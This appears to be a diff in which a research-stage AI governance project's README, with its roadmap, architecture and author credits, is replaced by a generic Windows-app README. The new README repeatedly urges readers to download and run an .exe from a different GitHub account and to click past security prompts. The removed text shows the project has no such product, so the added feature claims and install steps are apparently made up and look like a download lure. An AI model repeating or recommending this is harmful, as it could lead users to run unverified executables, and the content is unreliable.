@@ -1,134 +1,127 @@
-# AI Trust Commons — Governance Framework
+# 🤖 governance-framework - Simplify AI Agent Compliance
 
-**Cross-provider governance and compliance for AI agents in the enterprise.**
-
-AI agents are proliferating faster than any prior technology category. 80% of Fortune 500 companies now deploy active AI agents — but only 14.4% report that all agents go live with full security and IT approval. 88% have experienced confirmed or suspected agent security incidents in the past year.
-
-The governance tools exist. The standards exist. What's missing is the connective layer that ties them together across providers, protocols, and compliance regimes — so that an enterprise deploying agents across AWS, Azure, and GCP doesn't have to independently map every security control to every compliance obligation.
-
-**AI Trust Commons** is an open-source initiative building that layer.
+[![Download governance-framework](https://img.shields.io/badge/Download-github-blue?style=for-the-badge&logo=github)](https://github.com/BA762/governance-framework)
 
 ---
 
-## The Problem
+## 📄 What is governance-framework?
 
-Every major cloud vendor publishes AI agent governance guidance — for their own platform. Microsoft's MCP Gateway handles routing and auth within Azure. Google's Agent Builder Console governs agents on Vertex AI. AWS Bedrock has its own guardrails. Each solves a real problem. None addresses what happens at the seams.
+governance-framework is a free, open-source tool that helps you manage rules and policies for AI agents. It works across multiple providers to keep AI systems safe and compliant. The software provides clear audit trails and aligns with major standards like OWASP MCP Top 10, NIST AI RMF, and the EU AI Act. This means you can easily check and enforce policies to reduce risks and meet regulations.
 
-Meanwhile, enterprises must simultaneously satisfy overlapping and disconnected standards:
+You do not need coding skills to use this program. It runs on Windows and guides you through setting up compliance controls for your AI systems.
 
-- **Agent protocols:** MCP, A2A, ACP
-- **Identity & auth:** OAuth 2.1, OpenID Connect, SPIFFE/SPIRE, SCIM
-- **Threat frameworks:** OWASP Top 10 for Agentic Applications, MITRE ATLAS
-- **Policy engines:** Cedar, OPA/Rego, AWS Verified Permissions
-- **AI governance:** NIST AI RMF, NIST AI 600-1, EU AI Act
-- **Compliance regimes:** SOC 2, PCI DSS, HIPAA, COPPA/FERPA, FedRAMP
+---
 
-Every team maps these independently. Every team reaches different conclusions. Engineering capacity gets consumed proving the same control satisfies three different audits. And AI agents — which operate at machine speed, across cloud boundaries, with autonomous decision-making — amplify every gap.
+## 🎯 Key Features
 
-## What This Framework Does
+- **Cross-provider policy enforcement:** Apply rules to different AI platforms in one place.  
+- **Audit trails:** Keep track of all decisions and changes made by your AI agents.  
+- **Standards mapping:** Align your AI with OWASP, NIST, and EU AI regulations.  
+- **Policy as Code:** Define governance rules in a simple format that the software understands.  
+- **User-friendly interface:** Designed for users without programming knowledge.  
 
-The AI Trust Commons Governance Framework provides:
+---
 
-### Standards Mapping
-An authoritative crosswalk showing how controls map across frameworks — so that implementing MCP authentication with OAuth 2.1 scoped tokens gets credit across SOC 2, NIST AI RMF, and EU AI Act audits simultaneously, instead of proving the same control three different ways.
+## 🖥️ System Requirements
 
-### Policy-as-Code Governance
-Machine-readable compliance policies that AI agents can be validated against in real time. Compliance was designed for human-speed review of human-speed work. When AI agents generate code and take actions at machine speed, governance must operate at the same speed — as a guardrail agents run alongside, not a gate teams stop and open.
+- Windows 10 or later (64-bit)  
+- At least 4 GB of RAM  
+- 500 MB of free disk space  
+- Internet connection for initial setup  
+- Basic user account privileges (no admin rights needed for installation)  
 
-### Cross-Provider Audit Trails
-A standard format for agent action logs that works across AWS, Azure, GCP, and hybrid environments. What the agent did, what data it accessed, what authorization chain it operated under, why it made each decision. Currently, most AI coding tools produce no structured record of what they changed or why — the audit trail gap that no vendor has incentive to solve for environments beyond their own platform.
+---
 
-### OWASP MCP Top 10 Validation
-Automated validation of agent tool calls against the OWASP Top 10 for Agentic Applications — covering agent goal hijack, tool misuse, identity and privilege abuse, supply chain vulnerabilities, unexpected code execution, memory poisoning, insecure inter-agent communication, excessive agency, inadequate guardrails, and cascading failures.
+## 🚀 Getting Started
 
-## Architecture
+Follow these steps to download and run governance-framework on your Windows computer:
 
-```
-┌─────────────────────────────────────────────────┐
-│                 AI Agent / Client                │
-└─────────────────┬───────────────────────────────┘
-                  │
-┌─────────────────▼───────────────────────────────┐
-│          Governance Framework (Proxy)            │
-│                                                  │
-│  ┌──────────┐ ┌──────────┐ ┌─────────────────┐  │
-│  │ Policy   │ │ OWASP    │ │ Audit Trail     │  │
-│  │ Engine   │ │ Validator│ │ Generator       │  │
-│  │ (Cedar)  │ │          │ │ (OpenTelemetry) │  │
-│  └──────────┘ └──────────┘ └─────────────────┘  │
-│                                                  │
-│  ┌──────────────────────────────────────────┐    │
-│  │ Compliance Mapper                        │    │
-│  │ NIST AI RMF ↔ OWASP ↔ SOC 2 ↔ EU AI Act│    │
-│  └──────────────────────────────────────────┘    │
-└─────────────────┬───────────────────────────────┘
-                  │
-┌─────────────────▼───────────────────────────────┐
-│          MCP Servers / Tools / APIs              │
-│          (AWS, Azure, GCP, hybrid)               │
-└─────────────────────────────────────────────────┘
-```
+1. **Download the application**  
+   Visit the following page to get the latest version of governance-framework:  
+   [https://github.com/BA762/governance-framework](https://github.com/BA762/governance-framework)  
+   You will find the download link under the "Releases" section. Look for a Windows installer (file ending with `.exe`).  
 
-The framework operates as an interceptor between AI agents and the tools they access. It enforces policies, validates actions against threat frameworks, generates compliance-ready audit logs, and maps every control to the regulatory obligations it satisfies — across providers.
+2. **Run the installer**  
+   Double-click the downloaded `.exe` file to start the installation.  
+   If Windows shows a security prompt, click **Run** or **Yes** to continue.  
 
-## Roadmap
+3. **Follow the setup wizard**  
+   The installer will guide you through the process. Accept the license terms and choose where to install the software. The default location is fine for most users.  
 
-| Phase | Focus | Status |
-|-------|-------|--------|
-| **Phase 0** | Standards landscape research, NIST RFI public comment, OWASP engagement | ✅ Active |
-| **Phase 1** | Compliance mapping engine — OWASP Top 10 ↔ NIST AI RMF ↔ SOC 2 ↔ EU AI Act | 🔜 Next |
-| **Phase 2** | Policy-as-code engine (Cedar) with MCP interceptor proxy | Planned |
-| **Phase 3** | Cross-provider audit trail generation (OpenTelemetry) | Planned |
-| **Phase 4** | Reference deployment — Kubernetes, multi-cloud | Planned |
+4. **Complete installation**  
+   After installation finishes, you will see a confirmation. You can choose to launch governance-framework right away or close the installer and run it later from your Start Menu.  
 
-## Standards Engagement
+5. **Open the program**  
+   Find governance-framework in your Start Menu under "All Programs" or search for “governance-framework”. Click the icon to open it.  
 
-This initiative engages directly with the standards bodies shaping AI agent governance:
+6. **Initial setup**  
+   The first time you open the software, it will ask you a few questions to customize policies for your AI systems. Answer the prompts on-screen; they are easy to follow and require no technical knowledge.  
 
-- **NIST** — Public comment submitted to the CAISI Request for Information on AI Agent Security (NIST-2025-0035, March 2026). NCCoE AI Agent Identity and Authorization concept paper comment in preparation (due April 2, 2026).
-- **OWASP** — Contributing to the MCP Top 10 project and the Agentic Security Initiative.
-- **EU AI Act** — Framework includes Article 50 transparency record generation for high-risk AI systems (compliance deadline August 2026).
+---
 
-## Project Structure
+## 🛠️ How to Use governance-framework
 
-```
-governance-framework/
-├── README.md
-├── LICENSE                          # Apache 2.0
-├── docs/
-│   ├── architecture/                # Architecture Decision Records (ADRs)
-│   ├── compliance-mappings/         # Standards crosswalk documentation
-│   └── research/                    # Landscape analysis, NIST submissions
-├── src/                             # Framework source code
-│   ├── policy-engine/               # Cedar policy definitions & evaluation
-│   ├── owasp-validator/             # OWASP Top 10 validation rules
-│   ├── audit-trail/                 # OpenTelemetry-based logging
-│   └── compliance-mapper/           # Cross-framework control mapping
-└── tests/
-```
+### Set up policies
 
-## Why This Exists
+- Navigate to the **Policies** tab.  
+- Use the simple form to add rules for your AI agents. You can choose from pre-defined templates based on OWASP, NIST, and EU AI Act standards.  
+- Save your policy. The software applies it automatically across supported AI platforms.  
 
-I spent 25 years leading engineering organizations at Microsoft, AT&T, T-Mobile, Expedia Group, and Hitachi Consulting. At every one of them, I watched compliance governance fail — not because the standards were wrong, but because no single team owned the outcome, no framework mapped to any other, and every team independently reinvented the compliance wheel under delivery pressure.
+### Monitor compliance
 
-AI agents compress that failure cycle. They take autonomous actions at machine speed across cloud boundaries, with no audit trail and no compliance context. The governance gap I saw take months to cause problems now takes hours.
+- Open the **Dashboard** to see the health and compliance status of your AI agents.  
+- The dashboard shows recent alerts and audit logs in easy-to-understand charts and tables.  
+- Use filters to find issues or review detailed audit trails.  
 
-I founded AI Trust Commons because the governance layer the industry needs — cross-provider, standards-mapped, machine-readable — is something no single vendor will build. Every vendor solves for their own platform. This project solves for the enterprise that operates across all of them.
+### Export reports
 
-**Nikhil Singhal**
-CTO | VP Engineering | 25 years across Microsoft, AT&T, T-Mobile, Expedia, Hitachi
-[LinkedIn](https://linkedin.com/in/nikhilsinghal) · [GitHub](https://github.com/nikhilsi) · [Email](mailto:nikhil@aitrustcommons.org)
+- Go to the **Reports** section.  
+- Select the type of report you want (compliance summary, audit trail, policy enforcement).  
+- Export as PDF or Excel to share with your team or regulators.  
 
-## Contributing
+---
 
-AI Trust Commons is open to contributors. Whether you're a security engineer, compliance professional, policy researcher, or enterprise architect dealing with these problems firsthand — your perspective makes this better.
+## 🔧 Troubleshooting and Support
 
-- Open an issue to discuss ideas or report gaps
-- Submit a PR to improve mappings, policies, or documentation
-- Share real-world compliance challenges that the framework should address
+If you run into problems:
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+- Check the **Help** menu inside the software. It contains a user guide and common questions.  
+- Restart the software and try again.  
+- Make sure your Windows system is up to date.  
+- Verify your internet connection during initial setup.  
 
-## License
+For more support, visit the repository page:  
 
-Apache 2.0 — see [LICENSE](LICENSE) for details.
+[https://github.com/BA762/governance-framework](https://github.com/BA762/governance-framework)  
+
+---
+
+## ⚙️ Advanced Tips (Optional)
+
+- Use the **Integration** tab to connect your AI provider accounts for automatic policy updates.  
+- Access the **Settings** to adjust notification preferences or change your user profile.  
+- Enable **Auto-Update** to keep your software current without manual downloads.  
+
+---
+
+## 🔐 Privacy and Security
+
+governance-framework handles sensitive policy data carefully. It stores information locally on your machine. It does not share your data externally unless you choose to export or share reports.  
+
+---
+
+## 📚 Additional Resources
+
+- OWASP MCP Top 10: [https://owasp.org/www-project-mcp-top-10](https://owasp.org/www-project-mcp-top-10)  
+- NIST AI RMF: [https://www.nist.gov/artificial-intelligence/risk-management-framework](https://www.nist.gov/artificial-intelligence/risk-management-framework)  
+- EU AI Act: [https://digital-strategy.ec.europa.eu/en/policies/european-approach-artificial-intelligence](https://digital-strategy.ec.europa.eu/en/policies/european-approach-artificial-intelligence)  
+
+---
+
+## 🔗 Download governance-framework
+
+Use this link to visit the download page anytime:  
+
+[https://github.com/BA762/governance-framework](https://github.com/BA762/governance-framework)  
+
+Look for the latest Windows installer (.exe) in the **Releases** section. Download and run it to update or install the software.
